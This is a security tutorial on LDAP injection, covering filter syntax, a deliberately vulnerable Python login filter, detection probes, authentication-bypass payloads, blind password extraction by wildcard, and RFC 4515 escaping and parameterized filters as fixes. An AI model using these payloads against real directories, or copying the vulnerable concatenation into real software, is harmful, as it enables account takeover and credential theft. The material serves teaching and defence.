# What is LDAP Injection?

LDAP Injection is the directory-service cousin of SQL injection. When an app builds an LDAP search filter from user input without escaping it, an attacker can rewrite the filter to bypass authentication, enumerate the directory, or read attributes they should not see. It commonly shows up in login forms and address-book search backed by Active Directory or OpenLDAP.

## How it works

LDAP search filters use prefix (Polish) notation:

```text
(&(uid=alice)(userPassword=secret))    # AND: uid=alice AND password=secret
(|(uid=alice)(uid=bob))                # OR
(!(uid=admin))                         # NOT
```

Special characters `( ) * \ | & =` control the logic. Vulnerable code concatenates input:

```python
# VULNERABLE
filter = "(&(uid=" + username + ")(userPassword=" + password + "))"
```

Send username `*` and the filter matches everything. Send `admin)(&)` and you rewrite the logic.

## Impact

- **Authentication bypass** (log in without valid credentials)
- Enumerate all directory entries (users, groups)
- Extract sensitive attributes (`userPassword`, emails) one character at a time

## Step 1 - Detect

Inject each into a field that feeds an LDAP search and watch behaviour:

```text
*            -> results explode (matches all) = likely injectable
(            -> filter error / 500 = special char reaches LDAP
)(|(uid=*    -> breaks out of the current group
\28 \29      -> escaped paren, compare behaviour
```

## Step 2 - Authentication bypass

For a login building `(&(uid=USER)(userPassword=PASS))`:

```text
Username: *)(uid=*))(|(uid=*
Password: anything

# Resulting filter becomes always-true, collapsing the password check:
# (&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))
```

Other classic bypass values:

```text
Username: admin)(&)         Password: anything
Username: admin)(!(&(1=0    Password: anything
Username: *)(|(uid=*        Password: *
```

## Step 3 - Blind attribute extraction

When you cannot see the value but *can* see whether the filter matched, brute-force it char by char with wildcards:

```text
*)(userPassword=a*      -> no match  (password doesn't start with 'a')
*)(userPassword=s*      -> match!    (starts with 's')
*)(userPassword=se*     -> match!
*)(userPassword=sec*    -> match! ... keep going
```

## Tools

- [Burp Suite Intruder](https://portswigger.net/burp) - automate blind extraction (cluster bomb over charset)
- [ldapsearch](https://linux.die.net/man/1/ldapsearch) - validate filter behaviour directly
- [nmap ldap-brute NSE](https://nmap.org/nsedoc/scripts/ldap-brute.html)

```bash
# Query LDAP directly to understand the schema
ldapsearch -x -H ldap://target -b "dc=corp,dc=local" "(uid=*)"
```

## Mitigation - the fix

- **Escape** all special characters per RFC 4515 before building filters (`*` -> `\2a`, `(` -> `\28`, `)` -> `\29`, `\` -> `\5c`, NUL -> `\00`).
- Use the LDAP library's **parameterized / encoded filter builders** instead of string concatenation.
- Bind the app with a **least-privilege** service account.
- Validate input against an allowlist (a username is not `*`).

```java
// Java - use encodeFilter / a filter template rather than concatenation
String filter = "(&(uid={0})(userPassword={1}))";
Object[] args = { username, password };   // library escapes args
```

## Practice

- OWASP WebGoat LDAP injection lesson; bWAPP

## Deep dive

- [LDAP Injection - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [OWASP LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)

## CWE

- CWE-90: Improper Neutralization of Special Elements used in an LDAP Query
